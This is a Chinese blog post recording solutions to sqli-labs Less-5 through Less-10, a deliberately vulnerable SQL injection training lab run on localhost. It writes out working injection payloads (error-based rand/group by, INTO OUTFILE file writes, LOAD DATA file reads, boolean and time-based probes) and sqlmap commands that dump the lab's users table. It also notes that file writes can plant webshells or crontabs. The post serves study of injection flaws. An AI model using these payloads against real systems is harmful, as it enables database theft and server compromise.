<!doctype html><html lang=zh><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>sqli-labs 实验记录 #2</title><meta content="sqli-labs 实验记录 #2" name=title><meta content=一点点从这个世界上消失。 name=description><meta content=website property=og:type><meta content=https://nnnewb.github.io/posts/2022/sqli-labs-training-2/ property=og:url><meta content="weakptr's blog" property=og:site_name><meta content="sqli-labs 实验记录 #2" property=og:title><meta content=一点点从这个世界上消失。 property=og:description><meta content=https://nnnewb.github.io/image/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://nnnewb.github.io/posts/2022/sqli-labs-training-2/ property=twitter:url><meta content="sqli-labs 实验记录 #2" property=twitter:title><meta content=一点点从这个世界上消失。 property=twitter:description><meta content=https://nnnewb.github.io/image/favicon.ico property=twitter:image><link href=https://nnnewb.github.io/posts/2022/sqli-labs-training-2/ rel=canonical><link rel="shortcut icon" href=https://nnnewb.github.io/image/favicon.ico type=image/x-icon><link href=https://nnnewb.github.io/css/reset.css rel=stylesheet><link href=https://nnnewb.github.io/css/pallete.css rel=stylesheet><link href=https://nnnewb.github.io/css/suCSS.css rel=stylesheet><link href=https://nnnewb.github.io/archive.css rel=stylesheet><link href=https://nnnewb.github.io/style.css rel=stylesheet><script defer src=https://nnnewb.github.io/js/script.js></script><link crossorigin href=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y rel=stylesheet><script crossorigin defer integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js></script><script crossorigin defer integrity=sha384-zWYbd0NBwgTsgIdFKVprSfTh1mbMPe5Hz1X3yY4Sd1h/K1cQoUe36OGwAGz/PcDy src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/mathtex-script-type.min.js></script><script crossorigin defer integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js></script><script>document.addEventListener("DOMContentLoaded", function () {
        renderMathInElement(document.body, {
            // customised options
            // • auto-render specific keys, e.g.:
            delimiters: [
                { left: '$$', right: '$$', display: true },
                { left: '$', right: '$', display: false },
                { left: '\\(', right: '\\)', display: false },
                { left: '\\[', right: '\\]', display: false }
            ],
            // • rendering keys, e.g.:
            throwOnError: true
        });
    });</script><script src=https://cdn.jsdelivr.net/npm/mermaid@11.6.0/dist/mermaid.min.js></script><script>document.addEventListener('DOMContentLoaded', function () {
        // 查找所有具有 'pre' 标签且类名为 'language-mermaid' 的元素
        const mermaidElements = document.getElementsByClassName('language-mermaid');
        for (let i = 0; i < mermaidElements.length; i++) {
            const el = mermaidElements.item(i);
            if (el.tagName === "PRE" && !el.classList.contains('mermaid')) {
                el.innerHTML = el.textContent;
                el.classList.add('mermaid');
            }
        }

        mermaid.initialize({ startOnLoad: true, theme: 'dark', });
    })</script><script>if (window.location.hostname.toLowerCase() !== 'localhost' && window.location.hostname !== '127.0.0.1') {
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?dbb9df33a2de52aede8bccd84a7493ad";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    }</script><link href=https://chinese-fonts-cdn.deno.dev/packages/lxgwwenkaibright/dist/LXGWBright-Medium/result.css rel=stylesheet><link href=https://chinese-fonts-cdn.deno.dev/packages/maple-mono-cn/dist/MapleMono-CN-Regular/result.css rel=stylesheet><body><header><nav id=nav-bar><a href=/> 首页 </a>  /  <a href=/posts/> 文章 </a>  /  <a href=/categories/> 分类 </a>  /  <a href=/tags/> 标签 </a>  /  <a href=/search/> 搜索 </a>  /  <div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://nnnewb.github.io/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://nnnewb.github.io/click.ogg type=audio/ogg></audio></div></nav></header><main><h1>sqli-labs 实验记录 #2</h1><p class=author-line>作于：2022-05-10 15:14 ，预计阅读时间 9 分钟<article><h2 id=qian-yan>前言</h2><p>开始 sqli-labs 的第二轮训练。<blockquote><p><strong>!!!ATTENTION!!!</strong><p>在 MySQL 5.7.36 更新中，修复了 group by 报错 <code>Duplicate entry '0' for key '&lt;group_key>'</code> 的问题。<blockquote><p><a href=https://dev.mysql.com/doc/relnotes/mysql/5.7/en/news-5-7-36.html>Changes in MySQL 5.7.36 (2021-10-19, General Availability)</a><p>When a query uses a temporary table for aggregation, the group by item is used as a unique constraint on the temporary table: If the item value is already present, the row is updated; otherwise, a new row is inserted into the temporary table. If the item has a result field or reference item, it it evaluated twice, once to check whether the result exists in the temporary table and, if not, again while constructing the row to be inserted. When the group by item was nondeterministic, the result value used to check for existence differed from that with which an insert was attempted, causing the insert to be rejected if the value already existed in the table.<p>We fix this by using the hash of any nondeterministic items as the unique constraint, so that the hash is evaluated once only. (Bug #32552332)</blockquote><p>使用的 MySQL 版本 >=5.7.36 时，Less 5 和 Less 6 使用的 <code>select count(*), concat(version(), '~', floor(rand(14)*2)) x from user group by x;</code> 不会再报错。这个利用被彻底堵死了。</blockquote><h2 id=less-5-error-based-double-query>Less-5 Error-Based Double Query</h2><h3 id=yuan-li>原理</h3><p>有一篇<a href=https://blog.werner.wiki/principle-of-double-injection-in-mysql/>很好的文章</a>解释了这里的 Double Injection 指的是什么。我尽量概括一下。<p>先忽略 <em>Double Injection</em> 这个不明所以的名字，它代表技术原理的是利用 <code>group by &lt;col></code> 产生临时表，<code>col</code> 在临时表有唯一性约束，而 MySQL 在违反唯一性约束的错误信息里会提示违反唯一性的<code>col</code>内容是什么，由此产生信息泄露。<p>以一个案例来解释。下面的查询里<code>version()</code>是想爆的列，<code>concat(...)</code>连接目标列和随机数序列构造一个尽可能快出现冲突的<code>group key</code>。<code>floor(rand(14)*2)</code>产生的序列前四个结果是<code>1,0,1,0</code>，插入过程会产生两个<code>rand</code>调用（一次检查是否存在，一次插入新行），所以可以看成第一次查询<code>1</code>不存在，插入<code>0</code>；第二次查询<code>1</code>不存在，插入<code>0</code>，报错违反唯一性约束。<pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>select </span><span style=color:#fabd2f>count</span><span>(</span><span style=color:#fdf4c1>*</span><span>), concat(version(),</span><span style=color:#b8bb26>'~'</span><span>,floor(rand(</span><span style=color:#d3869b>14</span><span>)</span><span style=color:#fdf4c1>*</span><span style=color:#d3869b>2</span><span>)) x </span><span style=color:#fa5c4b>from</span><span> test </span><span style=color:#fa5c4b>group by</span><span> x;
</span></code></pre><p>其中一个比较有趣的点是为什么要用<code>rand</code>，能不能写一个固定值？<pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>select </span><span style=color:#fabd2f>count</span><span>(</span><span style=color:#fdf4c1>*</span><span>), concat(version(),</span><span style=color:#b8bb26>'~'</span><span>,</span><span style=color:#b8bb26>'hello'</span><span>) x </span><span style=color:#fa5c4b>from</span><span> test </span><span style=color:#fa5c4b>group by</span><span> x;
</span></code></pre><p>不行，这样做等于<code>group by</code>常量或者一个列，和普通<code>group by</code>没区别。<code>rand</code>发挥的关键作用是扰乱插入更新/插入临时表的过程。这个过程可以理解成这样：<pre class=language-go data-lang=go style=color:#fdf4c1aa;background-color:#282828><code class=language-go data-lang=go><span style=color:#fa5c4b>if </span><span style=color:#fe8019>!</span><span style=color:#fdf4c1>update</span><span>(</span><span style=color:#fdf4c1>group_key</span><span>, </span><span style=color:#fdf4c1>tally</span><span style=color:#fe8019>+</span><span style=color:#d3869b>1</span><span>) {
</span><span>    </span><span style=color:#fdf4c1>insert</span><span>(</span><span style=color:#fdf4c1>group_key</span><span>, </span><span style=color:#d3869b>1</span><span>)
</span><span>}
</span></code></pre><p>不使用<code>rand</code>时<code>update</code>和<code>insert</code>接收的就是同一个<code>group_key</code>，使用<code>rand</code>后<code>update</code>和<code>insert</code>就可能用的不是同一个<code>group_key</code>了，导致进入<code>insert</code>时插入的是已存在的<code>group_key</code>。<p>另一个有趣的问题是为什么要有<code>count(*)</code>？去掉<code>count(*)</code>就会导致不再报错。<p>等大佬解释。<h3 id=ti-jie>题解</h3><p><code>?id=1' union select null,concat(version(),'~',floor(rand(14)*2))x,count(*) from users group by x; --%20</code><p><img alt=image-20220510135044215 src=https://nnnewb.github.io/posts/2022/sqli-labs-training-2/image-20220510135044215.webp><blockquote><p><strong>Attention：</strong> MySQL版本 >=5.7.36 这个解法彻底失效。目前搜索 Double Injection 只有这一个解，如果有别的思路务必告知我。</blockquote><h2 id=less-6-error-based-double-query>Less-6 Error-Based Double Query</h2><p>和 Less-5 的区别只在于从单引号换成了双引号。稍微改一改 payload：<code>?id=1" union select null,concat(version(),'~',floor(rand(14)*2))x,count(*) from users group by x; --%20</code><p><img alt=image-20220510140208135 src=https://nnnewb.github.io/posts/2022/sqli-labs-training-2/image-20220510140208135.webp><h2 id=less-7-dump-into-outfile>Less-7 Dump into Outfile</h2><blockquote><p>**注意：**这题不要求 Error-Based 了，请注意。</blockquote><h3 id=yuan-li-1>原理</h3><p>简而言之，两个方面：<ol><li>利用 MySQL 的 <code>select ... into outfile|dumpfile &lt;filepath></code> 语法把查询结果保存到文件。<li>利用 MySQL 的 <code>LOAD DATA</code> 和 <code>LOAD XML</code> 语句读出任意文件内容。</ol><p>第一点可以用作覆盖磁盘上任意文件，通过 SQL 注入实现写入 webshell 或 crontab 等恶意行为。<p>第二点可以从 SQL 注入扩展到任意文件读取，MySQL 权限足够情况下可以拿到很多敏感文件内容。<h3 id=ti-jie-1>题解</h3><p>本题没有回显，虽然可以按盲注爆破，但题目提示是使用 <code>outfile</code>。所以最简单的解法就是两步走。<ol><li>注入 <code>SELECT ... INTO DUMPFILE</code> 导出结果到文件。<li>注入 <code>LOAD DATA</code> 进而拿到结果。</ol><p>先确认注入类型：<ul><li><code>?id=1 and 1=0;--%20</code> 无效<li><code>?id=1' and 1=0;--%20</code> 报错<li><code>?id=1" and 1=0;--%20</code> 无效</ul><p><img alt=image-20220510142759400 src=https://nnnewb.github.io/posts/2022/sqli-labs-training-2/image-20220510142759400.webp><p>所以是字符型注入，但SQL语句未知，尝试补括号：<code>?id=1') and 1=1;--%20</code>，依然报错，补两个括号后发现变正常：<code>?id=1')) and 1=1;--%20</code>。完成注入类型确认。<p><img alt=image-20220510142812936 src=https://nnnewb.github.io/posts/2022/sqli-labs-training-2/image-20220510142812936.webp><p>接着把<code>and</code>条件去掉，改成<code>into outfile '/var/www/html/dump.txt'</code>，完整 payload：<code>?id=1')) into outfile '/var/www/html/dump.txt';--%20</code><blockquote><p>**注意：**docker方式部署请注意，MySQL 镜像默认启用了 <code>--secure-file-priv</code> 选项，这个选项会禁用 <code>select .. into outfile|dumpfile</code>，使注入的SQL执行失败。<p>**注意：**docker-compose 方式部署的 sqli-labs 如果把 MySQL 和 PHP+Apache 分开部署，即使<code>select ... into outfile ...</code> 成功，也无法直接通过 HTTP 方式下载，这一利用也无法继续下去。</blockquote><p>上述注入如果成功的话可以直接访问 <code>http://localhost:8080/dump.txt</code> 下载到查询结果了。<h2 id=less-8-blind-boolian>Less-8 Blind Boolian</h2><p>题目是布尔盲注。确认 SQL 注入类型：<code>?id=1' and 1=1;--%20</code>。<p><img alt=image-20220510144442127 src=https://nnnewb.github.io/posts/2022/sqli-labs-training-2/image-20220510144442127.webp><p>典型的盲注，不自己动手了，接下来直接上 sqlmap。<pre class=language-bash data-lang=bash style=color:#fdf4c1aa;background-color:#282828><code class=language-bash data-lang=bash><span style=color:#fdf4c1>sqlmap -u </span><span style=color:#b8bb26>'http://localhost/Less-8/?id=1'</span><span style=color:#fdf4c1> --technique B -p id -T users --dump
</span></code></pre><pre style=color:#fdf4c1aa;background-color:#282828><code><span>Database: security
</span><span>Table: users
</span><span>[13 entries]
</span><span>+------+----------+------------+
</span><span>| id   | username | password   |
</span><span>+------+----------+------------+
</span><span>| 1    | Dumb     | Dumb       |
</span><span>| 2    | Angelina | I-kill-you |
</span><span>| 3    | Dummy    | p@ssword   |
</span><span>| 4    | secure   | crappy     |
</span><span>| 5    | stupid   | stupidity  |
</span><span>| 6    | superman | genious    |
</span><span>| 7    | batman   | mob!le     |
</span><span>| 8    | admin    | admin      |
</span><span>| 9    | admin1   | admin1     |
</span><span>| 10   | admin2   | admin2     |
</span><span>| 11   | admin3   | admin3     |
</span><span>| 12   | dhakkan  | dumbo      |
</span><span>| 14   | admin4   | admin4     |
</span><span>+------+----------+------------+
</span></code></pre><p>done。<h2 id=less-9-blind-time-based>Less-9 Blind Time-Based</h2><p>基于时间的盲注，先测试注入类型：<code>?id=1' and sleep(1);--%20</code><p><img alt=image-20220510145029175 src=https://nnnewb.github.io/posts/2022/sqli-labs-training-2/image-20220510145029175.webp><p>确认注入类型成功。接着还是上 sqlmap。<pre class=language-bash data-lang=bash style=color:#fdf4c1aa;background-color:#282828><code class=language-bash data-lang=bash><span style=color:#fdf4c1>sqlmap -u </span><span style=color:#b8bb26>'http://localhost/Less-9/?id=1'</span><span style=color:#fdf4c1> --technique T -p id -T users --dump --count 1
</span></code></pre><p>基于时间的盲注非常慢，即使 sqlmap 做了优化，依然非常慢，所以只提取一行。我懒得等就直接 ctrl+c 了。总之，就到这里结束。<h2 id=less-10-blind-time-based-doublequotes>Less-10 Blind Time-Based DoubleQuotes</h2><p>和 Less-9 一样，换成了双引号。<code>sqlmap</code>需要加上<code>--level 2</code>参数，让 <code>sqlmap</code> 更努力一点。<h2 id=zong-jie>总结</h2><p>两个知识点一个教训。<p>知识点：<ol><li><code>rand</code>结合<code>group by</code>实现报错注入，不过遗憾的是 MySQL 5.7.36 修复了，将来这个技巧算废了。<li><code>select ... into outfile|dumpfile</code>和<code>load data</code>。对MySQL和php分开部署的情况能导出不能下载，MySQL容器默认禁止了文件权限，无法利用。</ol><p>教训则是接受失败和耐心尝试。尝试 Less-7 的时候，因为多出来的两个右括号，第一次补右括号无效后我差点就放弃尝试直接去看源码了。后来不抱什么希望再补了一个右括号，发现成功了的时候真的很惊喜，甚至有点庆幸。这也算是一次对自己的惰性的胜利吧。<p>虽然啥也没干还是辛苦我自己了。</article><p class=tags-data><a href=/tags/security>/security/</a> <a href=/tags/sqli>/sqli/</a> <a href=/tags/sqli-labs>/sqli-labs/</a></p><script data-repo-id="MDEwOlJlcG9zaXRvcnkzOTg0ODYyMTg=" async crossorigin data-category=Announcements data-category-id=DIC_kwDOF8Bqys4Cegmn data-emit-metadata=0 data-input-position=bottom data-lang=zh-CN data-mapping=pathname data-reactions-enabled=1 data-repo=nnnewb/nnnewb.github.io data-strict=0 data-theme=noborder_light id=giscus_script src=https://giscus.app/client.js></script></main><footer><hr><div id=footer-container><div><p style=text-align:center>Copyright © 2018-2024 weakptr <a href=mailto:weak_ptr@outlook.com>&lt;weak_ptr@outlook.com></a><p style=text-align:center>Built with <a rel="noopener noreferrer" href=https://www.getzola.org target=_blank>Zola</a> using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> theme, <a rel="noopener noreferrer" href=https://speyll.github.io/suCSS/ target=_blank>suCSS</a> framework & <a rel="noopener noreferrer" href=https://github.com/Speyll/veqev target=_blank>veqev</a>, modified by <a rel="noopener noreferrer" href=https://github.com/nnnewb/ target=_blank>nnnewb</a>.<p style=text-align:center>Theme and color theme licensed under <a rel="noopener noreferrer" href=https://en.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a>.</div></div></footer>